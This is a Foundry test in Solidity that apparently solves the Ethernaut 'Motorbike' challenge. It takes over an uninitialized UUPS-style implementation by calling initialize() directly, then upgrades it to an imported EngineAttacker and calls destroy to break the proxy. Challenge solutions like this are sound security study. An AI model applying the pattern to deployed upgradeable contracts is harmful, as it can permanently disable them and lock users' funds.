// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Motorbike, Engine, EngineAttacker} from "../src/Motorbike.sol";

contract MotorbikeTest is Test {
    Motorbike motorbike;
    Engine engine;

    address deployer = address(1);

    function setUp() public {
        engine = new Engine();
        vm.prank(deployer);
        motorbike = new Motorbike(address(engine));
    }

    function test_Attack() public {
        engine.initialize();
        // Check everything is working:
        Engine(address(motorbike)).setHorsePower(42);
        assertEq(Engine(address(motorbike)).horsePower(), 42, "must update horse power");

        EngineAttacker attacker = new EngineAttacker();
        engine.upgradeToAndCall(address(attacker), abi.encodeWithSelector(attacker.destroy.selector));

        vm.expectRevert();
        Engine(address(motorbike)).setHorsePower(43);
    }
}
